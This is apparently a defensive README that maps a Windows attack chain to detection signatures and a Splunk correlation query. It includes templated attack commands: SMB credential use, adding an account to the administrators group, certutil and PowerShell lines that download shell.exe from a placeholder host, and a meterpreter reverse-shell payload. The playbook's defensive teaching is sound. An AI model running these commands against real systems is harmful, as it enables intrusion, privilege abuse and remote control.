# 🛡️ Detection Engineering & Threat Hunting: The Master Playbook

![MITRE](https://img.shields.io/badge/MITRE-Attack%20Chain-red)
![Focus](https://img.shields.io/badge/Focus-Detection%20Engineering-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![Status](https://img.shields.io/badge/Playbook-Complete-success)

---

## 📌 Project Overview

This project demonstrates a **full adversary attack chain** and corresponding **detection strategies** across multiple stages of compromise.

Rather than focusing on isolated alerts, this playbook builds:

- ✔️ Attack simulation  
- ✔️ Threat detection  
- ✔️ Timeline correlation  
- ✔️ Multi-stage visibility  

This mirrors **real-world SOC operations** and **enterprise detection workflows**.

---

## 🧪 Attack Lifecycle Overview
```
Recon → Initial Access → Persistence
↓
Privilege Escalation → Lateral Movement
↓
Tool Transfer → Reverse Shell
↓
Privilege Token Abuse

```

---
## ⚔️ Phase 1: Reconnaissance & Initial Access (SMB)

The attack begins with **credential testing** using SMB authentication.

Attackers verify credentials and browse remote shares.

---

## 💻 Attack Logic

Protocol:

```
Server Message Block (SMB)
```

Command:

```bash
impacket-smbclient <user>:<password>@<Target_IP>

```

---
## 🔍 Detection Signatures

Monitor:
```
Event ID 4624 — Successful Logon
Logon Type 3 → Network Logon
```
Confirms:

- ✔️ Remote authentication
```
Event ID 4625 — Failed Logon
```
Indicates:

- ⚠️ Brute-force activity
- ⚠️ Password spraying

---
## ⚔️ Phase 2: Persistence & Privilege Escalation

Attackers ensure long-term access by modifying local accounts.

## 💻 Attack Logic

Command:
```bash
net localgroup administrators <username> /add

```
Goal:

- ✔️ Permanent admin access

---
## 🔍 Detection Signatures

Monitor:

|Event ID	|Description |
|---------|------------|
|4720	|User account created |
|4732	|User added to admin group |


---
## 🚨 Additional Indicator
```
net.exe or net1.exe execution
```
Used to modify group membership.

---
## ⚔️ Phase 3: Lateral Movement & Remote Execution

Attackers move across systems using trusted administrative tools.

---
## 💻 Attack Logic

Two common tools:

- ✔️ WMIExec
- ✔️ PSExec

---
## 🔍 Detection Signatures (Parent-Child Tracking)
WMI Signature
```
wmiprvse.exe → cmd.exe / powershell.exe
```
Indicates:

- ✔️ Remote WMI execution

PSExec Signature
```
services.exe → PSEXESVC.exe
```
Or:
```
services.exe → random_service_binary.exe
```
Indicates:

- ✔️ PSExec-based execution

---
## ⚔️ Phase 4: Ingress Tool Transfer (LoLBins)

Attackers download payloads using trusted Windows tools.

This is called:
```
Living off the Land Binaries (LoLBins)
```

---
## 💻 Attack Logic
Python HTTP Server (Attacker)

Hosts:
```cmd
shell.exe
```
Download Methods
Certutil
```cmd
certutil.exe -urlcache -split -f http://<IP>/shell.exe shell.exe
```
PowerShell
```powershell
powershell iwr -uri http://<IP>/shell.exe -outfile shell.exe
```

---
## 🔍 Detection Signatures

Monitor:

- ✔️ Command-line execution
- ✔️ Network activity

Key Indicators
```
certutil.exe with -urlcache
```
Sysmon Network Detection
```
Event ID 3 → Outbound connection
```
Triggered by:

- ✔️ certutil.exe
- ✔️ powershell.exe

---
## ⚔️ Phase 5: Command & Control (C2) — Reverse Shell

Attackers execute payloads to establish persistent remote control.

---
## 💻 Attack Logic

Payload:
```bash
windows/x64/meterpreter/reverse_tcp
```
Connection Type:
```
Reverse TCP
```

---
## 🔍 Detection Signatures

Suspicious Execution Path
```
C:\Users\Public\
C:\Users\<user>\Desktop\
```
Callback Ports

Monitor:
```
4444
8080
1337
```
Outbound TCP traffic to attacker infrastructure.

---
## ⚔️ Phase 6: Privilege Token Analysis ("God Mode")

Final stage: attacker obtains SYSTEM-level privileges.

This unlocks powerful Windows capabilities.

---
## 📂 Sensitive Privileges to Monitor

Look for these privileges in:
```
Event ID 4672
Event ID 4673
```

---
## 🚨 Critical Privileges

|Privilege	|Risk |
|-----------|-----|
|SeDebugPrivilege	|Memory access (Mimikatz usage) |
|SeTakeOwnershipPrivilege	|Full object control |
|SeTcbPrivilege	|Act as OS |

These are high-value threat indicators.

---
## 📊 Universal Splunk Detection Logic

This query normalizes multiple log sources into a single unified timeline.
```spl
index=* (EventCode IN (4688, 1, 4672, 4732, 3))

| eval User = coalesce(Account_Name,
                       user,
                       TargetUserName)

| eval Process = coalesce(New_Process_Name,
                          Image,
                          process_name)

| eval Parent = coalesce(Creator_Process_Name,
                         ParentImage,
                         ParentProcessName)

| eval Remote_IP = coalesce(DestinationIp,
                            Source_Network_Address,
                            ip)

| table _time,
         User,
         Process,
         Parent,
         Remote_IP,
         Privileges

| sort - _time

```

---
## 🏆 Final Summary Table

|Attack Phase	|Event ID	|Key Detection Signal |
|Initial Access	|4624	|Logon Type 3 |
|Persistence	|4732	|Admin group modification |
|Lateral Movement	|4688	|wmiprvse → cmd.exe |
|Tool Transfer	|1 (Sysmon)	|certutil or iwr |
|C2 Callback	|3 (Sysmon)	|Outbound TCP |
|Privilege Escalation	|4672	|SeDebugPrivilege |

---
## 🧠 Key Takeaway

Real attackers do not trigger one alert — they create attack chains.

Detection Engineering success comes from:

- ✔️ Correlating multiple events
- ✔️ Understanding attacker behavior
- ✔️ Building timeline visibility

---
## 🏁 Final Conclusion

This playbook demonstrates how to detect:

- ✔️ Credential-based access
- ✔️ Privilege escalation
- ✔️ Lateral movement
- ✔️ Payload delivery
- ✔️ Reverse shell activity
- ✔️ Privilege abuse

Together, these detections form a complete attack visibility pipeline.

---
## ✍️ Author

Abhay

🔐 Detection Engineer
🧠 Threat Hunter
📊 SIEM Engineer
---
